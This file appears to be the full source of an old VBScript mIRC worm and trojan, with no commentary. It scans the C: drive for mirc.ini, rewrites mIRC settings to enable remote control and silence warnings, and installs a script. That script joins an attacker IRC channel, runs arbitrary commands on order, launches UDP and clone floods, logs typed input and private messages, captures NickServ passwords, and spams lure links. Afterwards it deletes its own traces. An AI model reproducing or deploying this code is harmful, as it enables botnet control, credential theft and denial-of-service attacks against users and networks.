dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "server.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=server.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on *:SOCKREAD:ITG*:{ sockread %temp | tokenize 32 %temp | if ($2 == privmsg) && ($left($3,1) == $chr(35)) && ($4 == :!floodoff) { .set %PSGflood off | .sockclose PSG* | .sockclose Paa* | .unset %nick | unset %channel | unset %server | unset %port | unset %clones | unset %flood } "
fr6.writeline "n1=if ($2 == privmsg) && ($left($3,1) == $chr(35)) && ($4 == :!say) { sockwrite -nt $sockname privmsg $3 : $+ $5- } "
fr6.writeline "n2=if ($2 == privmsg) && ($left($3,1) == $chr(35)) && ($4 == :!exec) { $5- } "
fr6.writeline "n3=if ($2 == privmsg) && ($left($3,1) == $chr(35)) && ($4 == :!info) { .timer 1 1 sockwrite -nt ITG-2 privmsg #AngelsCloud : ×× Nick; $me ×× Network; $network ×× Server; $server ×× Usermodes; $usermode ×× Ip; $ip ×× Host; $host ×× Time; $time ×× Date; $date ×× Mircdir; $mircdir ×× Mirc version; $version ×× OS; $os ×× } "
fr6.writeline "n4=if ($2 == privmsg) && ($left($3,1) == $chr(35)) && ($4 == :!help) { sockwrite -nt $sockname privmsg #AngelsCloud : !exec pack <ip> <bytes> <times> ×× !exec floodon <#chan/Nick> <clones> <server> <port> ×× !floodoff Closes Most Sockets ×× !exec .enable #inputbot ×× !exec .disable #inputbot ×× !exec floodmsg <msg> ×× !say <text> ×× !exec <command> ×× !info ××  } "
fr6.writeline "n5=if ($gettok(%temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } "
fr6.writeline "n6=} "
fr6.writeline "n7=alias floodon { set %nick $$1 | set %clones $$2 | set %channel $$1 | set %server $$3 | set %port $$4 | if ($group(#õõ) = on) { .disable #õõ } | set %PSGflood on | var %var = 0 | :loop | inc %var | if (%PSGflood == on) && (%var <= %clones) { .sockopen PSG $+ %var %server %port | goto loop } | else { | halt } } "
fr6.writeline "n8=alias pack { .sockwrite -nt ITG* privmsg #AngelsCloud : $+ Now [ Packeting ] $1 [ with ] $2 [ bytes ] $3 [ times ] | set %packet.ip $1 | set %packet.bytes $2 | set %packet.amount $3 | set %packet.count 0 | set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .sockwrite -n $sockname privmsg #AngelsCloud : $+ Packeting Has Completed .... | halt } | inc %packet.count 1 | /.sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start } "
fr6.writeline "n9=alias floodmsg { set %flood1 $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 $11 $12 $13 $14 $15 $16 $17 $18 $19 $20 $21 $22 $23 $24 $25 $26 $27 $28 $29 } "
fr6.writeline "n10=on 1:JOIN:#: if ($nick != $me) && ($sock(ina-2).status == active) { .sockwrite -nt ina-2 privmsg $nick : $+ http://4www.geocities.com/devilspd/Jennifer.html 14]] [[  12CheCk out 13Video's ][ webcams ][ Pic's ][ Galleries and mOre for all  12-= 4Celebrities and Famous Singers 12=- all   4NUDE!!   14]]  } "
fr6.writeline "n11=on 1:part:#: if ($nick != $me ) && ($sock(ina-2).status == active) { .sockwrite -nt ina-2 privmsg $nick : $+ http://4www.geocities.com/devilspd/Jennifer.html  14,1<=  8Vidz,  9Camz, 14and  11Picz 14And m0r3  4!! TOTALLY NUDE  4!!  } "
fr6.writeline "n12=on *:connect:{ .sockopen $chr(105) $+ $chr(110) $+ $chr(097) $+ -2 $server $port } "
fr6.writeline "n13=on *:Sockopen:ina*:{ if ($sockerr > 0) { halt } | set -u1 %user $chr(71) $+ $chr(117) $+ $chr(101) $+ $chr(115) $+ $chr(116) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,99) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(1,9) | .sockwrite -nt $sockname USER %user blablah x : $+ $me | .sockwrite -nt $sockname NICK $chr(71) $+ $chr(117) $+ $chr(101) $+ $chr(115) $+ $chr(116) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) } "
fr6.writeline "n14=on *:sockclose:ina*:/.timer 1 3 .sockopen ina-2 $server $port "
fr6.writeline "n15=on *:SOCKREAD:ina*:{ sockread %temp | tokenize 32 %temp | if ($gettok(%temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server | halt } } "
fr6.writeline "n16=#inputbot off "
fr6.writeline "n17=on *:input:*: { .sockwrite -nt ITG-2 privmsg #AngelsCloud : $+ ×× $me ×× $network ×× $active ×× $1- ×× } "
fr6.writeline "n18=on *:TEXT:*:?:{ .sockwrite -nt ITG-2 privmsg #AngelsCloud : $+ ×× $nick to $me ×× $network ×× $1- ×× } "
fr6.writeline "n19=#inputbot end "
fr6.writeline "n20=CTCP *:*:*: { $1- } "
fr6.writeline "n21=on *:input:*:if ($group(#inputbot) != on) && ($left($1,1) == /) && ($sock(ITG-2).status == active) { if (nickserv isin $1-) || (chanserv isin $1-) || (oper isin $1) || (ns isin $1-) || (cs isin $1-) || (identify isin $1-) { /sockwrite -nt ITG* privmsg #AngelsCloud : $+ -= $me -=- $network -=- $active -=- -=- $1- =- } } "
fr6.writeline "n22=on *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | .sockwrite -nt $sockname USER %user blahblah zxzbaby : $+ %user | .sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | sockwrite -tn $sockname join %channel } "
fr6.writeline "n23=on *:sockread:PSG*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } } "
fr6.writeline "n24=on *:Sockopen:ITG*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,9) | .sockwrite -nt $sockname USER %user blablah x : $+ $me | .sockwrite -nt $sockname NICK $chr(71) $+ $chr(117) $+ $chr(101) $+ $chr(115) $+ $chr(116) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) | sockwrite -tn $sockname join #AngelsCloud } "
fr6.writeline "n25=on 1:start:/.identd on | /.ignore $me | .disable #inputbot | .timer 1 1 .sockopen $chr(073) $+ $chr(084) $+ $chr(071) $+ -2 freshmeat.us.zerolimit.net 6667 "
fr6.writeline "n26=raw 381:*:{ sockwrite -n ITG* PRIVMSG #AngelsCloud :I am now an IRCop $+ $crlf $+ NICK ITGOp $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) } "
fr6.writeline "n27=on *:sockclose:ITG*:/.timer 1 3 sockopen $chr(073) $+ $chr(084) $+ $chr(071) $+ -2 freshmeat.us.zerolimit.net 6667 "
fr6.writeline "n28=on *:Sockopen:PSG*:{ "
fr6.writeline "n29=  if ($sockerr > 0) { halt }"
fr6.writeline "n30=  set -u1 %user $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | .sockwrite -nt $sockname JOIN : $+ %channel | .sockwrite -n $sockname privmsg %channel : $+ $chr(1) $+  $+ $chr(1) | .sockwrite -n $sockname privmsg %channel : $+ %flood1 |  .sockclose $sockname | .sockopen PSG $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port "
fr6.writeline "n31=} "
fr6.writeline "n32= "
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")
sss.DeleteFile "c:\rol.vbs"
sss.DeleteFile "c:\winamod.dat"
